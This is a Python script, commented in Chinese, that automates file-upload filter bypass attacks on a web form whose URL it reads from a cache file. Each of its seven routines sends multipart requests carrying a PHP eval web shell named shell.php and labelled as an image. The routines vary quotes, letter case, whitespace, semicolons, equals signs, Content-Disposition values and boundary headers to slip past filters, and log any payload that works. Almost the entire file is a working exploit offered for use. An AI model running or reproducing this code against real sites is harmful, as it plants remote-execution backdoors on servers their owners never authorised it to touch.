import os
import re
import requests,random
from urllib.parse import unquote

class Character:

    def __init__(self,data):
        self.data = data

    #引号变换
    def gojileixing1(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        zidian1 = ['form-data','\'from-data\'','\"from-data\"']
        zidian2 = [shangchuan,'\'%s\''%shangchuan,'\"%s\"'%shangchuan]
        zidian3 = ['shell.php','\'shell.php\'','\"shell.php\"','\'shell.php','\"shell.php','\'shell.php;','\"shell.php;']
        zidian4 = ['%s'%anniubianlianming,'\'%s\''%anniubianlianming,'\"%s\"'%anniubianlianming]
        headers = {
            'Host':"%s"%duurl[7:],
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'Content-Type': "multipart/form-data; boundary=----14022921886665468183488432462"
        }
        for x in zidian3:
            for t in zidian2:
                for r in zidian1:
                    for k in zidian4:
                        payloads ="""
                        ------14022921886665468183488432462""" +"""
                        Content-Disposition: %s; name=%s; filename=%s
                        Content-Type: image/png
                
                        <?php @eval($_POST['hack']); ?>
                
                        ------14022921886665468183488432462"""%(r,t,x) +"""
                        Content-Disposition: %s; name=%s
                
                        %s
                        ------14022921886665468183488432462"""%(r,k,anniu)+ """--
                
                    """
                        response = requests.post(url=duurl, headers=headers, data=payloads, timeout=0.5)
                        result2 = response.text
                        if (result != result2):
                            pass
                        else:
                            urls.write('\n' + ''''
引号变换:
%s
''' %payloads + '\n')
                            urls.close()
                            return '''
引号变换:
%s
''' %payloads
        return 0

    #大小写变换
    def gojileixing2(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        headers = {
            'Host':"%s"%duurl[7:],
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'Content-Type': "multipart/form-data; boundary=----14022921886665468183488432462"
        }
        zifu1 = ''
        zifu2 = ''
        zifu3 = ''
        tihuan = ['n','a','m','e']
        tihuan2 = ['c','o','n','t','e','n','t','-','d','i','s','p','o','s','i','t','i','o','n'] #Content-Disposition
        tihuan3 = ['f','i','l','e','n','a','m','e']
        for x in range(len(tihuan2)):
            zifu1 = tihuan2[x].upper()
            tihuan2[x] = zifu1
            flag = "".join(tihuan2)
            for t in range(len(tihuan3)):
                zifu2 = tihuan3[t].upper()
                tihuan3[t] = zifu2
                flag2 = "".join(tihuan3)
                for k in range(len(tihuan)):
                    zifu3 = tihuan[k].upper()
                    tihuan[k] = zifu3
                    flag3 = "".join(tihuan)
                    payloads = """
                    ------14022921886665468183488432462""" + """
                    %s: form-data; %s="%s"; %s="shell.php"
                    Content-Type: image/png
            
                    <?php @eval($_POST['hack']); ?>
            
                    ------14022921886665468183488432462""" % (flag,flag3,shangchuan,flag2) + """
                    %s: form-data; %s="%s"
            
                    %s
                    ------14022921886665468183488432462""" % (flag,flag3,anniubianlianming,anniu) + """--
            
                """
                    response = requests.post(url=duurl, headers=headers, data=payloads, timeout=0.5)
                    result2 = response.text
                    if (result != result2):
                        pass
                    else:
                        urls.write('\n' + ''''
大小写变换:
%s
''' % payloads + '\n')
                        urls.close()
                        return '''
大小写变换:
%s
''' % payloads
        return 0

    #filename和字段值之间添加空白符或换行符绕过
    def gojileixing3(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        headers = {
            'Host':"%s"%duurl[7:],
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'Content-Type': "multipart/form-data; boundary=----14022921886665468183488432462"
        }
        zidian = ['%09','%0a','%0b','%0c','%0d','%20','%a0','%00']
        for x in zidian:
            ceshifu = x
            ceshifu = unquote(ceshifu)
            payloads = """
            ------14022921886665468183488432462""" + """
            Content-Disposition: form-data; name="%s"; filename=%s"shell.php"
            Content-Type: image/png
    
            <?php @eval($_POST['hack']); ?>
    
            ------14022921886665468183488432462""" %(shangchuan,ceshifu) + """
            Content-Disposition: form-data; name="%s"
    
            %s
            ------14022921886665468183488432462""" % (anniubianlianming,anniu) + """--
    
                    """
            response = requests.post(url=duurl, headers=headers, data=payloads, timeout=0.5)
            result2 = response.text
            if (result != result2):
                pass
            else:
                urls.write('\n' + ''''
filename和字段值之间添加换行符%s:
%s
''' %(x,payloads) + '\n')
                urls.close()
                return '''
filename和字段值之间添加换行符%s:
%s
''' %(x,payloads)
            return 0

    #多个分号绕过;需要分号分开可插入多个分号
    def gojileixing4(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        headers = {
            'Host': "%s" % duurl[7:],
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'Content-Type': "multipart/form-data; boundary=----14022921886665468183488432462"
        }
        ceshifu = ''
        for x in range(10000):
            ceshifu += ';'
            payloads = """
            ------14022921886665468183488432462""" + """
            Content-Disposition: form-data;%sname="%s";%sfilename="shell.php"
            Content-Type: image/png

            <?php @eval($_POST['hack']); ?>

            ------14022921886665468183488432462""" % (ceshifu,shangchuan, ceshifu) + """
            Content-Disposition: form-data;%sname="%s"

            %s
            ------14022921886665468183488432462""" % (ceshifu,anniubianlianming, anniu) + """--

            """
            response = requests.post(url=duurl, headers=headers, data=payloads, timeout=0.5)
            result2 = response.text
            if (result != result2):
                pass
            else:
                urls.write('\n' + ''''
多个分号绕过,需要分号分开可插入多个分号:%s
%s
''' % (ceshifu, payloads) + '\n')
                urls.close()
                return '''
多个分号绕过:%s
%s
''' % (ceshifu, payloads)
        return 0

    # 多个等号测试
    def gojileixing5(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        headers = {
            'Host': "%s" % duurl[7:],
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'Content-Type': "multipart/form-data; boundary=----14022921886665468183488432462"
        }
        ceshifu = ''
        for x in range(10000):
            ceshifu += '='
            payloads = """
            ------14022921886665468183488432462""" + """
            Content-Disposition: form-data; name=%s"%s";filename=%s"shell.php"
            Content-Type: image/png

            <?php @eval($_POST['hack']); ?>

            ------14022921886665468183488432462""" % (ceshifu, shangchuan, ceshifu) + """
            Content-Disposition: form-data; name=%s"%s"

            %s
            ------14022921886665468183488432462""" % (ceshifu, anniubianlianming, anniu) + """--

            """
            response = requests.post(url=duurl, headers=headers, data=payloads, timeout=0.5)
            result2 = response.text
            if (result != result2):
                pass
            else:
                urls.write('\n' + ''''
多个等号测试绕过,有等号的地方可以插入多个等号:%s
%s
''' % (ceshifu, payloads) + '\n')
                urls.close()
                return '''
多个等号测试绕过,有等号的地方可以插入多个等号:%s
%s
''' % (ceshifu, payloads)
        return 0

    # 变换Content-Disposition的值
    def gojileixing6(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        headers = {
            'Host': "%s" % duurl[7:],
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
            'Content-Type': "multipart/form-data; boundary=----14022921886665468183488432462"
        }
        zifu1 = ''
        tihuan2 = ['f','o','r','m','-','d','a','t','a']  # form-data
        charu = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        for x in range(len(tihuan2)):
            suiji = random.randint(0,61)
            suiji = charu[suiji:]
            zifu1 = tihuan2[x].upper()
            tihuan2[x] = zifu1
            flag = "".join(tihuan2)
            suiji2 = random.randint(0,len(flag)-1)
            fenkai = flag[suiji2:]
            flag = flag[suiji2-1:] + suiji + fenkai + suiji
            payloads = """
            ------14022921886665468183488432462""" + """
            Content-Disposition: %s; name="%s"; filename="shell.php"
            Content-Type: image/png

            <?php @eval($_POST['hack']); ?>

            ------14022921886665468183488432462""" % (flag,shangchuan) + """
            Content-Disposition: %s; name="%s"

            %s
            ------14022921886665468183488432462""" % (flag,anniubianlianming,anniu) + """--

        """
            response = requests.post(url=duurl, headers=headers, data=payloads, timeout=0.5)
            result2 = response.text
            if (result != result2):
                pass
            else:
                urls.write('\n' + ''''
变换Content-Disposition的值:%s
%s
''' %(flag,payloads) + '\n')
                urls.close()
                return '''
变换Content-Disposition的值:%s
%s
''' %(flag,payloads)
        return 0

    # 畸形的boundary头部
    def gojileixing7(self):
        zhuanhuan = eval(self.data)
        jilu = eval(open(os.getcwd() + '\\jilu.txt', 'r+').read())
        urls = open(os.getcwd() + '\\cache\\' + 'ip.txt', 'r+')
        duurl = urls.read().split('\n')[0]
        base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
        stri = ''
        shangchuan = jilu['上传变量名'][0]
        anniu = jilu['提交按钮变量名'][1]
        anniubianlianming = jilu['提交按钮变量名'][0]
        guize = re.compile('=\'\w*\'|="\w*"')
        guize2 = re.compile('=\'\w*\'|="\w*"')
        shangchuan = guize.findall(shangchuan)[0][2:-1]
        anniubianlianming = guize.findall(anniubianlianming)[0][2:-1]
        anniu = guize.findall(anniu)[0][2:-1]
        res = requests.post(url=duurl)
        result = res.text
        zifu1 = ''
        tihuan2 = ['m','u','l','t','i','p','a','r','t','/','f','o','r','m','-','d','a','t','a']  # multipart/form-data
        charu = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789\|/?!@#$%^()'
        payloads = """
        ------14022921886665468183488432462""" + """
        Content-Disposition: form-data; name="%s"; filename="shell.php"
        Content-Type: image/png

        <?php @eval($_POST['hack']); ?>

        ------14022921886665468183488432462""" % shangchuan + """
        Content-Disposition: form-data; name="%s"

        %s
        ------14022921886665468183488432462""" % (anniubianlianming, anniu) + """--

    """
        for x in range(len(tihuan2)):
            suiji = random.randint(0, 61)
            suijisuju = charu[suiji:]
            zifu1 = tihuan2[x].upper()
            tihuan2[x] = zifu1
            flag = "".join(tihuan2)
            headers = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "%s; boundary=----14022921886665468183488432462"%(flag)
            }
            headers2 = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "multipart/form-data %s boundary=----14022921886665468183488432462"%(suijisuju)
            }
            headers3 = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "multipart/form-data,%s,boundary=----14022921886665468183488432462"%(suijisuju)
            }
            headers4 = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "%s %s boundary=----14022921886665468183488432462"%(flag,suijisuju)
            }
            headers5 = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "%s,%s,boundary=----14022921886665468183488432462"%(flag,suijisuju)
            }
            headers6 = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "multipart/form-data;%s&123**{|}boundary=----14022921886665468183488432462"%(suijisuju)
            }
            headers7 = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "%s;%s&123**{|}boundary=----14022921886665468183488432462"%(flag,suijisuju)
            }
            headers8 = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "multipart/form-data;boundary=----14022921886665468183488432462;%s"%(suijisuju)
            }
            headers9 = {
                'Host': "%s" % duurl[7:],
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
                'Content-Type': "%s;boundary=----14022921886665468183488432462%s"%(flag,suijisuju)
            }
            panduan = [headers2,headers3,headers4,headers5,headers6,headers7,headers8,headers9]
            for x in panduan:
                response = requests.post(url=duurl, headers=x, data=payloads, timeout=0.5)
                result2 = response.text
                if (result != result2):
                    pass
                else:
                    urls.write('\n' + ''''
畸形的boundary头部的值:%s
%s
''' % (flag, x) + '\n')
                    urls.close()
                    return '''
畸形的boundary头部的值:%s
%s
''' % (flag, x)
        return 0
    def kaihuo(self):
        jiance = self.gojileixing1()
        jiance2 = self.gojileixing2()
        jiance3 = self.gojileixing3()
        jiance4 = self.gojileixing4()
        jiance5 = self.gojileixing5()
        jiance6 = self.gojileixing6()
        jiance7 = self.gojileixing7()
        jiehe = [jiance,jiance2,jiance3,jiance4,jiance5,jiance6,jiance7]
        for x in jiehe:
            if(x):
                print(x)
        print('''
        漏洞情报缓存信息保存在/cache/ip.txt文件里.
        ''')

for x in os.listdir():
    if ('jilu.txt' in x):
        dakai = open('jilu.txt', 'r+').read()
        rub = Character(dakai)
        rub.kaihuo()
    else:
        pass  # 功能待开发.